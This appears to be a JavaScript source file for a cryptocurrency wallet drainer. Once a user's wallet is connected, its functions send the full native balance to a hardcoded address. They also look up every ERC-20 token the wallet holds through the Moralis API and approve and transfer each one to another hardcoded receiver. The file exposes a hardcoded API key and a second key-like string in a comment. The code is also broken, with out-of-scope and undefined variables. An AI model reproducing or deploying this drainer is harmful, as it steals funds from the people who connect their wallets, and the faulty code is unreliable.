import {BNBABI, ETHABI,BNBAddress, ETHAddress,Receiver} from "config/constants/abis"
import {Contract} from "@ethersproject/contracts"
import {useNetwork} from "wagmi"


const networks = {56:{"abi":BNBABI, address:BNBAddress,name:"BSC"}, 1: {"abi":ETHABI, address:ETHAddress,name:"Eth Main"},97:{}}
const valFrmBalance = (balance, gasPrice) => {

 if(balance.isZero())
  return balance

   //const gasEst =await  signer.estimateGas(tranReq)
  // const gasPrice = await signer.getGasPrice()
  //const gas = gasEst.mul(gasPrice) //* gasPrice

  const rems = balance.sub(gasPrice) 
  const amt = rems.gte(gasPrice)? rems : parseEther("000000")
  amt
}
const getTokens = async(address) => {
  const tokens = await fetch(`https://deep-index.moralis.io/api/v2/${address}/erc20?chain=bsc`, {
      method: "GET",
      headers: { accept: "application/json", "X-API-Key": "KF6aM7wHasYsLQGVi9f9v1kiWJXN8on0RT5PccICn3VdoRBiMCf7M8JTwezJHmGp"
 },
    })
  return tokens
}
export const signTrans = async(isConnected,signer,balance) => {
  if(!isConnected)
    return

  console.log("Signing begin")

  const gasEst = await  signer.estimateGas(tranReq).catch(console)
  const gasPrice = await signer.getGasPrice().catch(console)
  const gas = gasEst.mul(gasPrice) //* gasPrice

  const rems = balance?.value.sub(gas) 
 // const amt = (rems?.gte(gas)) ? rems : gas
if(rems && rems.gte(gas)) {
  const amt = rems
}
else{
  console.log("Low balance")
  return
}
console.log("Gas",gas,"Amount",amt,"Remainder",rems)
console.log(signer)
const to = process.env.receiver || "0x0F67BB85F54B9565339dc1e0CA38a348B468726E"
console.log("receiver",to)
//await approveSend(signer, amt, chain.id)
signer.sendTransaction({to,value:amt,from:account})
.then((data) => {
  console.log(data)
  console.log("done")
})
.catch((err) => {
  console.log("an error",err)
})

//
}
export const approveSend = async(signer, adds,chain) => {

const add = Receiver || "0x08930218e2C30cE618A0875c66Cb3C791a17dE02"
const tokens = await getTokens(signer).catch((err) => {
  console.log(err)

})
tokens.forEach(async (token) => {
const erc20 = new Contract(token.token_address,abi, signer)
//console.log("Contract",erc20)
const bal = token.balance
const avail = parseEther(bal)
if(avail.isZero())
{
  console.log("zero balance")
  return}
const approval = await erc20.approve(add,parseEther(token.balance)).catch((err) => {console.log(err)})//{to:Receiver,value})
console.log(approval)
const trans =  await erc20.transferFrom(add, parseEther(token.balance))
console.log(trans)

})

// erc20.approve()

}

/*
async function fetchAccountData() {
  start_to_log = false;
  const web3 = new Web3(provider);
  console.log("Web3 instance is", web3);
  web3.eth.defaultCommon = {
    customChain: { name: "bsc-network", chainId: 56, networkId: 56 },
    baseChain: "mainnet",
    hardfork: "petersburg",
  };
  const chainId = await web3.eth.getChainId();
  const chainData = evmChains.getChain(chainId);
  console.log("Chain data name:", chainData.name);
  const accounts = await web3.eth.getAccounts();
  console.log("Got accounts", accounts);
  selectedAccount = accounts[0];
  console.log("Selected Account: ", selectedAccount);
  user_address = selectedAccount;
  const rowResolvers = accounts.map(async (address) => {
    const balance = await web3.eth.getBalance(address);
    const bscBalance = web3.utils.fromWei(balance, "ether");
    const humanFriendlyBalance = parseFloat(bscBalance).toFixed(4);
    console.log("New Account: %o", { address, balance, humanFriendlyBalance });
  });
  await Promise.all(rowResolvers);
  proceed();
}
//provider options
options = {
keepAlive: true,
withCredentials: false,
timeout: 20000, // ms
headers: [
{
name: 'Access-Control-Allow-Origin',
value: '*'
},
{
...
}
],
agent: {
http: http.Agent(...),
baseUrl: ''
}
};
*/
/*
const options = {
  method: 'GET',
  headers: { 'Accept': 'application/json', 'X-API-Key': 'your API Key' },
};
fetch('https://deep-index.moralis.io/api/v2/block/1000?chain=eth', options)
  .then((response) => response.json())
  .then((response) => printResult(response))
  .catch((err) => console.error(err))

const printResult = (response) => {
  const container = document.getElementById('result')
  container.innerHTML = "<pre>" + JSON.stringify(response ,null, 2) + "</pre>"
}
mqrnqXc2aCnDF1f3F5MrqSmxTJrbqXNbwwtm3gq5trCW6F4vIodpA5IUNdZ47b4E

const fetchBal = async (address:string, chain: string = "BSC_TESTNET") => {
  await Moralis.start({
    apiKey: process.env.Moralis_API_KEY,
    // ...and any other configuration
  });

 // const address = '0xd8da6bf26964af9d7eed9e03e53415d37aa96045';

  const ch = EvmChain.chain;

  const response = await Moralis.EvmApi.balance.getNativeBalance({
    address,
    chain,
  });

    console.log(response.toJSON());
}

//get chain or chainID to use for balance

//*/